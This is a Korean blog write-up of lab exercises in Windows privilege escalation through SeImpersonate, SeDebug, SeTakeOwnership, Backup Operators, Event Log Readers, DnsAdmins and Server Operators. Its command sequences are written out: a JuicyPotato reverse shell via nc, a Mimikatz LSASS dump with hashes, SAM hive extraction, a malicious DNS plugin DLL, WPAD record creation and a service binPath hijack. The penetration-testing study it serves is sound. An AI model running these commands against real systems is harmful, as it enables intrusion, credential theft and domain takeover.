---
title: "Windows Privilege Escalation - User and Group Privileges"
date: 2026-06-16
layout: single
excerpt: "Windows의 SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege와 Backup Operators, Event Log Readers, DnsAdmins, Server Operators 등을 각각 악용하여 권한 상승으로 이어지는 과정을 실습한다."
author_profile: true
toc: true
toc_label: "Windows Privilege Escalation"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, user-privileges, built-in-groups, access-token]
---

Windows의 SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege와 Backup Operators, Event Log Readers, DnsAdmins, Server Operators 등을 각각 악용하여 권한 상승으로 이어지는 과정을 실습한다.

# User Privileges

## SeImpersonatePrivilege

Windows에는 `SeImpersonatePrivilege` 같은 토큰 관련 권한이 존재한다.

`SeImpersonatePrivilege` 는 **클라이언트가 인증한 이후 그 클라이언트의 보안 컨텍스트를 가장(`impersonation`)할 수 있게 해주는 권한**이다. 

우선 높은 권한의 클라이언트가 공격자가 제어하는 IPC/RPC/Named Pipe 등의 경로로 인증하도록 유도하는 과정이 필요하다.

서비스 계정에는 `SeImpersonatePrivilege` 가 부여되는 경우가 있으며, IIS나 SQL Server 같은 서비스 컨텍스트에서 자주 확인되는 권한 중 하나이다.

### Privilege Verification

우선 MSSQL에 접속하였다:

```bash
$ impacket-mssqlclient sql_dev:'Str0ng_P@ssw0rd!'@10.129.97.112 -windows-auth 

SQL (WINLPE-SRV01\sql_dev  dbo@master)>
```

우선 `sysadmin` 역할인지 확인하기 위해 다음 쿼리로 확인하였다:

```text
SQL (WINLPE-SRV01\sql_dev  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
1 
```

`1` 이 반환되었으므로 현재 로그인은 SQL Server의 `sysadmin` 역할을 가지고 있다. 

따라서 `xp_cmdshell` 을 활성화한 뒤 운영체제 명령을 실행할 수 있다:

```text
SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
```

```text
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami

output                          
-----------------------------   
nt service\mssql$sqlexpress01   
```

현재 명령은 MSSQL 서비스 계정인 `NT SERVICE\MSSQL$SQLEXPRESS01` 컨텍스트에서 실행되고 있다.

실제로 토큰 권한을 확인하면 다음과 같다:

```text
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell "whoami /priv"
                                                                   

Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

현재 `SeImpersonatePrivilege` 가 `Enabled` 상태임을 확인할 수 있다.

이 권한을 악용하는 대표적인 계열로 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), `JuicyPotato/RoguePotato` 같은 도구들이 있다. 

이러한 공격은 높은 권한의 서비스가 공격자 쪽으로 인증하도록 유도한 뒤 그 보안 컨텍스트를 가장하여 최종적으로 SYSTEM 권한의 프로세스를 생성하는 형태로 이어질 수 있다.

우선 로컬에서 nc 리스너를 열었다:

```bash
$ nc -lvnp 9001
```

그 후 JuicyPotato를 실행하였다:

```text
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.181 9001 -e cmd.exe" -t *
  
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         

......                                                       

[+] authresult 0                                             

{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   

NULL                                                         

[+] CreateProcessWithTokenW OK                               

[+] calling 0x000000000088ce08  
```

리스너에서 연결을 확인한 결과 SYSTEM 셸을 획득하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv1.png)

## SeDebugPrivilege

`SeDebugPrivilege` 는 다른 프로세스와 스레드를 디버깅하기 위해 일반적인 프로세스 접근 제어 제한을 넘어 강한 접근 권한을 요청할 수 있게 해주는 특권이다.

즉, 이 권한이 활성화된 프로세스는 일반적으로 접근하기 어려운 다른 프로세스에 대해 강한 권한의 핸들을 얻을 수 있으며, 그 결과 프로세스 메모리를 읽는 등의 민감한 작업이 가능해질 수 있다. 

대표적인 예로 LSASS 메모리 접근이 있다.

`jordan` 사용자에게는 다음과 같이 `SeDebugPrivilege` 가 존재한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv2.png)

### Reading LSASS with Mimikatz

이를 토대로 Mimikatz를 활용하여 LSASS 프로세스에 접근한 뒤, 메모리에 존재하는 자격 증명 정보를 조회할 수 있다.

따라서 Mimikatz를 실행한 후 다음과 같이 명령어를 입력하였다:

```text
mimikatz.exe "log credentials.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

이렇게 실행하면 `SeDebugPrivilege` 를 활성화한 후 LSASS 메모리에 존재하는 로그온 세션의 자격 증명 정보를 조회하며, 결과는 `credentials.txt` 파일에 저장된다.

따라서 `credentials.txt` 파일을 확인한 결과 LSASS 메모리에서 다음과 같은 자격 증명 정보를 확인할 수 있었다:

```text
Authentication Id : 0 ; 913114 (00000000:000deeda)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 8/8/2026 7:05:28 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

# SKIP

Authentication Id : 0 ; 278469 (00000000:00043fc5)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 8/8/2026 6:57:05 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :
```

이렇게 획득한 NTLM 해시는 대상 계정과 원격 서비스의 조건이 맞는 경우 Pass-the-Hash를 이용한 횡적 이동 등에 활용될 수 있다.

---

## SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` 는 파일, 디렉터리, Registry Key, 서비스 등 객체의 **Owner를 변경할 수 있게 해주는 권한**이다.

예를 들면 다음과 같이 각 경로는 서로 별도의 객체이다:

```text
C:\Users\Admin\              ← 디렉터리 객체 A
├─ Desktop\                  ← 디렉터리 객체 B              
│  └─ secret.txt             ← 파일 객체 C
└─ Documents\                ← 디렉터리 객체 D
   └─ password.txt           ← 파일 객체 E
```

각 객체는 서로 다른 Owner와 DACL을 가질 수 있다. 

또한 부모 디렉터리의 Owner를 변경했다고 해서 기존 하위 파일들의 Owner가 자동으로 모두 변경되는 것은 아니다.

### Security Descriptor Structure

Windows의 보안 객체 구조를 단순화하면 다음과 같다:

```text
Security Descriptor
│
├─ Owner
│
├─ DACL
│   ├─ ACE: Administrator = Full Control
│   ├─ ACE: UserA = Read
│   └─ ACE: UserB = Deny Write
│
└─ SACL
    └─ 감사 규칙
```

DACL은 **누가 이 객체에 어떤 작업을 할 수 있는지**를 결정하고, ACE는 DACL을 구성하는 개별 권한 항목이다.

Owner가 되었다고 해서 파일의 데이터에 대한 `Read`, `Write`, `Full Control` 이 자동으로 부여되는 것은 아니다. 

다만 일반적인 Windows 접근 검사에서는 Owner에게 보안 정보 확인 및 DACL 변경과 관련된 암시적 권한이 주어질 수 있으므로, Owner가 된 뒤 자신의 ACE를 추가하여 실제 데이터 접근 권한을 얻는 흐름이 가능하다.

또한 `C:\Users\Admin\Documents\` 와 `C:\Users\Admin\Documents\password.txt` 는 서로 다른 객체이므로 DACL도 별도로 적용된다. 

특정 파일에 대한 권한이 있더라도 부모 디렉터리의 목록 조회 권한까지 자동으로 생기는 것은 아니다.

현재 토큰을 확인하면 `SeTakeOwnershipPrivilege` 가 존재하지만 비활성화되어 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv3.png)

이 실습에서는 토큰에 이미 존재하는 비활성 Privilege를 활성화하기 위해 [EnableAllTokenPrivs](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)를 사용하였다:

```text
PS C:\tools> Import-Module .\Enable-Privilege.ps1

PS C:\tools> .\EnableAllTokenPrivs.ps1
```

다시 확인하면 `SeTakeOwnershipPrivilege` 가 활성화된 것을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv4.png)

이 권한을 이용하여 `C:\Department Shares\Private\IT\cred.txt` 파일의 소유자를 변경해보았다.

먼저 일반적인 읽기를 시도하면 접근이 거부된다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv5.png)

현재 사용자에게 해당 파일의 데이터 읽기 권한이 없기 때문이다.

`takeown` 을 이용해 Owner를 현재 사용자로 변경하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv6.png)

이제 `cred.txt` 의 Owner는 `htb-student` 로 변경되었다.

`icacls` 로 DACL을 확인하면 `SYSTEM` 과 `Administrators` 에만 `Full Control` ACE가 존재한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv7.png)

Owner가 된 뒤 자신의 ACE를 추가하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv8.png)

그 결과 파일을 정상적으로 읽을 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv9.png)

### SAM File Analysis

동일한 방식을 `C:\Windows\System32\config\SAM` 에 적용하던 중, Owner는 변경되었지만 `icacls /grant` 단계에서 `ACCESS DENIED` 가 발생하였다.

원인을 확인하기 위해 [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)을 사용하여 `icacls.exe` 가 SAM 파일에 접근하는 과정을 확인하였다.

첫 번째 SAM 관련 이벤트에서 다음과 같이 `CreateFile` 요청이 바로 `ACCESS DENIED` 로 실패하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv10.png)

세부 정보의 `Desired Access: Read Attributes` 는 `FILE_READ_ATTRIBUTES` 접근 권한을 의미한다.

즉 이 환경의 `icacls.exe` 는 DACL 수정 작업에 도달하기 전에 먼저 SAM 파일을 `FILE_READ_ATTRIBUTES` 로 열려고 했고, 이 단계에서 접근이 거부되었다.

따라서 ProcMon에서는 이후 SAM 경로에 대한 `QuerySecurityFile` 또는 `SetSecurityFile` 단계가 나타나지 않았다.

여기서 구분해야 하는 권한은 다음과 같다:

1. `FILE_READ_ATTRIBUTES` : 파일의 속성 정보를 읽을 수 있는 권한
2. `READ_CONTROL`         : 객체의 보안 정보를 읽을 수 있는 권한
3. `WRITE_DAC`            : 객체의 DACL을 수정할 수 있는 권한

Owner가 된다고 해서 `FILE_READ_ATTRIBUTES` 를 포함한 모든 파일 권한이 자동으로 생기는 것은 아니다.

일반 파일인 `cred.txt` 에서 동일한 과정을 확인하면 첫 번째 파일 Open이 성공한 뒤 `QuerySecurityFile` 과 `SetSecurityFile` 단계까지 진행되고, 최종적으로 변경에 성공한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv11.png)

`SetSecurityFile` 은 **파일의 Security Descriptor를 설정하는 작업**이다. 

이 실험에서는 `icacls /grant` 를 수행했기 때문에 그 작업을 통해 DACL이 변경되었다.

현재 ProcMon 결과만으로 확정할 수 있는 것은 **SAM에서는 `icacls` 가 `FILE_READ_ATTRIBUTES` 단계에서 먼저 실패하여 DACL 설정 단계까지 도달하지 못했다는 점**이다. 

Owner의 암시적 `WRITE_DAC` 권한을 직접 요청했을 때도 실패하는지까지 확정하려면 Win32 API 등으로 별도의 접근 검사를 수행해야 한다.

---

# Group Privileges

## Windows Built-in Groups (SeBackupPrivilege)

Windows의 `Backup Operators` 그룹은 백업 작업을 수행하기 위한 내장 그룹이다. 

최소 권한 원칙에 따라 전체 Domain Admin 권한 대신 백업에 필요한 권한만 위임할 때 사용할 수 있다.

이 그룹에는 대표적으로 다음 Privilege가 부여될 수 있다:

```text
SeBackupPrivilege
SeRestorePrivilege
```

여기서는 `SeBackupPrivilege` 를 확인한다.

토큰에 `SeBackupPrivilege` 가 존재하지만 Disabled 상태라면 먼저 활성화해야 한다. 

이 실습에서는 이미 활성화된 상태를 기준으로 진행한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv12.png)

`SeBackupPrivilege` 는 백업 목적으로 객체를 열 때 Backup Semantics를 사용하여 일반적인 파일 읽기 ACL 제한을 우회할 수 있게 해준다. 

우선 해당 파일을 `cat` 으로 읽어보았다:

```powershell
PS C:\Users\svc_backup> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
```

현재 사용자에게 파일을 읽을 권한이 존재하지 않아 접근이 거부되었다.

하지만 `SeBackupPrivilege` 를 활용하여 백업용 API를 사용하는 도구에서는 해당 파일을 복사할 수 있다.

`Copy-FileSeBackupPrivilege` 를 사용하기 전에 필요한 모듈을 불러온다:

```powershell
PS C:\tools> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\tools> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

그 후 백업 권한을 이용하여 파일을 복사한다:

```powershell
PS C:\Users\svc_backup> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' '.\Contract.txt'

Copied 88 bytes
```

그 결과 복사된 파일을 읽는 데 성공하였다:

```powershell
PS C:\Users\svc_backup> cat .\Contract.txt

Inlanefreight 2021 Contract

=============================

Board of Directors:
```

### Shadow Copy and Offline Hives

`diskshadow.exe` 는 Windows의 VSS(Volume Shadow Copy Service)를 제어하는 내장 도구이다. 

이 실습에서는 `C:` 의 특정 시점 Shadow Copy를 생성한 뒤 이를 `E:` 로 노출하였다:

```powershell
PS C:\Users\svc_backup> diskshadow

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
# SKIP
Querying all shadow copies with the shadow copy set ID {29c90821-b9da-44b3-ad85-f91fb6364baf}

        * Shadow Copy ID = {90f0192f-5580-4962-9eb6-e37898c2d645}                 %cdrive%
                - Shadow copy set: {29c90821-b9da-44b3-ad85-f91fb6364baf}      %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original Volume name: \\?\Volume{ef0784b0-d2f4-4a86-9c82-9fde2cc89dc5}\ [C:\]
                - Creation Time: 8/10/2026 3:00:04 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: WINLPE-DC01.INLANEFREIGHT.LOCAL
                - Service machine: WINLPE-DC01.INLANEFREIGHT.LOCAL
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes: No_Auto_Release Persistent Differential

Number of shadow copies listed: 1

DISKSHADOW> expose %cdrive% E:
-> %cdrive% = {90f0192f-5580-4962-9eb6-e37898c2d645}
The shadow copy was successfully exposed as E:\.
DISKSHADOW> end backup
DISKSHADOW> exit
```

이후 `E:` 드라이브를 확인하면 Shadow Copy의 디렉터리 구조를 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv13.png)

테스트로 현재 실행 중인 Windows의 `C:` 드라이브에 존재하는 SAM 파일을 직접 복사하려고 시도하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv14.png)

하지만 `0x80070020 (ERROR_SHARING_VIOLATION)` 오류가 발생하였다.

이유는 현재 사용 중인 Live SAM 파일을 `Copy-FileSeBackupPrivilege` 로 직접 열려고 시도하면서, Windows가 이미 해당 파일을 열어 사용 중인 상태와 새로운 백업 요청이 충돌했기 때문이다.

따라서 Live Registry Hive는 `reg save` 를 이용하여 백업할 수도 있다:

```text
C:\Users\svc_backup> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.
```

```text
C:\Users\svc_backup> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

또는 앞서 `C:` 드라이브의 Shadow Copy를 `E:` 로 연결해두었기 때문에, 현재 실행 중인 Windows가 직접 사용하고 있는 Live SAM 파일이 아니라 Snapshot에 저장된 SAM, SYSTEM 파일을 복사할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv15.png)

SAM과 SYSTEM Hive를 로컬로 가져온 이후, 로컬 계정의 해시를 분석할 수 있다:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump -sam SAM -system SYSTEM local

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

또한 `robocopy /B` 를 이용하여 Backup Mode로 복사하는 방법도 존재한다.

## Event Log Readers

프로세스 생성 감사(`Audit Process Creation`)가 활성화되어 있으면 새로운 프로세스가 생성될 때 Security Event Log에 Event ID `4688` 이 기록될 수 있다.

> 추가로 **Include command line in process creation events** 정책까지 활성화되어 있다면, 실행 파일 이름뿐 아니라 명령줄 인자도 이벤트에 포함될 수 있다. 

따라서 명령줄에 직접 입력한 사용자 이름이나 비밀번호가 로그에 남는 경우가 있다.

`Event Log Readers` 그룹은 이벤트 로그를 읽기 위한 권한을 위임할 때 사용되는 내장 그룹이다. 

> 다만 로그 종류와 API에 따라 추가 권한이 필요한 경우도 있으므로, 그룹 멤버십만으로 모든 Security 로그 조회 방식이 항상 동일하게 동작하는 것은 아니다.

현재 `logger` 사용자의 그룹을 확인하면 `Event Log Readers` 그룹에 속해 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv16.png)

### Searching Security Event Logs

이후 `wevtutil` 로 Security 로그를 조회한 뒤 `/user` 문자열을 필터링하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv17.png)

그 결과 자격 증명 정보가 확인되었다.

이러한 정보가 실제로 유효하고 다른 시스템에 재사용되고 있다면 횡적 이동의 단서가 될 수 있다.

## DnsAdmins

`DnsAdmins` 그룹의 구성원은 Windows DNS Server를 관리할 수 있는 권한을 가진다.

Windows DNS Server는 Custom Plugin DLL 기능을 지원하며, `ServerLevelPluginDll` 설정을 통해 DNS 서비스가 시작될 때 추가 DLL을 로드하도록 구성할 수 있다.

DNS Server 서비스는 `NT AUTHORITY\SYSTEM` 권한으로 실행되므로, `DnsAdmins` 가 이 설정을 악용할 수 있는 환경에서는 높은 권한의 코드 실행으로 이어질 수 있다.

현재 `netadm` 사용자의 그룹을 확인하면 `INLANEFREIGHT\DnsAdmins` 그룹에 속해 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv18.png)

### DNS Service Permissions

우선 DNS Service DACL을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv19.png)

현재 `netadm` 의 SID에 `RPWP` 가 부여되어 있다:

```text
RP = SERVICE_START
WP = SERVICE_STOP
```

즉 `netadm` 이 DNS 서비스를 시작하고 중지할 수도 있다.

그 후 Domain Admins 그룹에 `netadm` 을 추가하는 명령을 실행하는 DLL을 생성하였다:

```bash
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

Payload size: 313 bytes
Final size of dll file: 9216 bytes
Saved as: adduser.dll
```

`ServerLevelPluginDll` 은 **DNS 서비스 전용 Plugin DLL 설정값**이다:

```text
ServerLevelPluginDll
```

`dnscmd.exe` 는 Windows DNS Server를 관리하는 도구이며, `/serverlevelplugindll` 옵션을 이용해 DNS가 로드할 DLL 경로를 설정할 수 있다.

따라서 `dnscmd.exe` 를 이용하여 `ServerLevelPluginDll` 에 악성 DLL 경로를 설정하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv20.png)


설정이 정상적으로 적용되었으며, DNS 서비스가 해당 DLL을 로드할 수 있도록 Plugin DLL 경로 등록에 성공하였다.

그 후 DNS 서비스를 중지하고 다시 시작하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv21.png)

서비스가 다시 시작되면서 등록한 DLL이 로드된다.

마지막으로 Domain Admins 멤버십을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv22.png)

결과적으로 `netadm` 사용자가 `Domain Admins` 그룹에 추가된 것을 확인할 수 있다.

### Creating a WPAD Record

`DnsAdmins` 를 악용하는 또 다른 경로로 WPAD Record 조작이 있다. 

이는 **같은 DNS 관리 권한을 이용하는 별도의 공격 경로**이다.

Windows DNS는 `WPAD` 와 `ISATAP` 같은 특정 이름이 악용되는 것을 막기 위해, 기본적으로 차단 목록(`Global Query Block List`)에 등록해두고 조회를 제한할 수 있다:

```text
WPAD
ISATAP
```

DnsAdmins 권한으로 차단 목록을 비활성화할 수 있는 환경이라면 다음과 같이 설정할 수 있다:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

그 후 공격자 IP를 가리키는 WPAD A Record를 만들 수 있다:

Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

WPAD를 사용하는 클라이언트가 해당 레코드를 신뢰하면 공격자 시스템을 Proxy로 사용하도록 유도될 수 있으며, 이후 `Responder/Inveigh` 등을 이용한 인증 정보 캡처 또는 Relay 공격으로 이어질 가능성이 있다.

## Server Operators

`Server Operators` 그룹은 Domain Admin 권한을 직접 부여하지 않고도 Windows Server와 Domain Controller의 일부 관리 작업을 수행할 수 있도록 만들어진 고권한 그룹이다.

이 그룹에는 `SeBackupPrivilege`, `SeRestorePrivilege` 같은 강한 Privilege가 부여될 수 있으며, 서비스 객체에 대한 강한 제어 권한을 갖는 환경도 존재한다.

현재 `server_adm` 사용자가 `Server Operators` 그룹에 속해 있음을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv23.png)

### Service Abuse Conditions

서비스를 이용한 권한 상승이 가능한지는 단순히 서비스가 존재하는지만으로 결정되지 않는다. 최소한 다음 조건을 확인해야 한다:

1. 서비스가 LocalSystem 등 높은 권한으로 실행되는가?
2. 현재 사용자/그룹이 SERVICE_CHANGE_CONFIG 권한을 가지는가?
3. 서비스를 직접 시작할 수 있는 SERVICE_START 권한이 있는가?
4. 이미 실행 중인 서비스를 중지해야 한다면 SERVICE_STOP도 있는가?

`SERVICE_CHANGE_CONFIG` 는 **특정 서비스 객체의 설정을 변경할 수 있는 Access Right**이며, 서비스의 `binPath` 와 같은 구성값을 수정할 때 필요한 권한이다.

`PsService` 로 `AppReadiness` 서비스의 DACL을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv24.png)

결과를 확인한 결과 `Server Operators` 그룹에 해당 서비스에 대한 `All` 권한이 부여되어 있었다.

먼저 `sc qc` 로 서비스의 설정을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv25.png)

`binPath` 에는 단순한 파일 경로뿐 아니라 실행 파일과 인자를 포함하는 명령줄 문자열이 들어갈 수 있다.

따라서 `Server Operators` 가 `SERVICE_CHANGE_CONFIG` 를 가지고 있으므로 다음과 같이 `AppReadiness` 의 `binPath` 를 변경하였다:

```powershell
PS C:\Users\server_adm> sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

다시 확인하면 설정한 값이 `BINARY_PATH_NAME` 에 반영되어 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv26.png)

이제 서비스를 시작하면 SCM은 `AppReadiness` 를 LocalSystem 계정으로 시작하려고 하면서 변경된 명령줄을 실행한다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv27.png)

이 경우 `cmd.exe` 는 정상적인 Windows Service 프로그램이 아니기 때문에 서비스 시작 상태를 보고하지 못하고 `1053` 오류가 발생할 수 있다. 

하지만 그 전에 `cmd /c net localgroup ...` 명령 자체는 LocalSystem 컨텍스트에서 실행될 수 있다.

따라서 로컬 Administrators 그룹을 다시 확인하면 `server_adm` 이 추가된 것을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-user-and-group-privileges/windows-priv28.png)